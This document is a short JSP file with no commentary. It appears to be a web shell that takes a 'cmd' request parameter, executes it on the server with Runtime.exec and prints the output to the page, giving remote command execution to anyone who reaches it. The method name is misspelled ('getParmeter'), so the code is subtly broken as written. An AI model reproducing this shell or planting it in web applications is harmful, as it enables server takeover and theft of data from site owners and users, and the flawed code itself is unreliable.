<%@page import="java.io.*"%>
<%
	out.print("Hello</br>");

	String strcmd=request.getParmeter("cmd");
	String line=null;

	Process p=Runtime.getRuntime().exec(strcmd);
	BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));

	while((line=br.readLine())!=null){
		out.print(line+"</br>");
    }
%>